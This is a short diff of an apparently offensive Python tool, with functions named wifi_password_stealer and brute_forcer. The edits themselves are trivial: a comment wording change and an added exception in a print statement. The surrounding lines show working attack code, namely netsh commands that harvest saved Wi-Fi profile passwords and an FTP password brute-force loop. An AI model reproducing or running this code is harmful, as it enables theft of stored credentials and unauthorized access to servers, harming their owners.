@@ -9,7 +9,7 @@ def wifi_password_stealer():
     command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
     # using regular expressions to grep the string we want from the above command output and save it into a variable
     profile_names = set(re.findall(r"All User Profile\s*:(.*)", command_output))
-    # this will store the wifi ssids and their corresponding password(ssid: password)
+    # this will store the Wi-Fi ssids and their corresponding password(ssid: password)
     wifi_data = ""
 
     # iterate through the profile names
@@ -69,7 +69,7 @@ def brute_forcer():
                         print(f"{Fore.GREEN}Password Found: {password}", Fore.RESET)
                         break
                     except Exception as e:
-                        print(f"Trying...:{password}")
+                        print(f"Trying...:{password}", e)
                         continue
 
     # check if our ftp server accepts anonymous login, if not we try to brute force the password using the ftp_buster
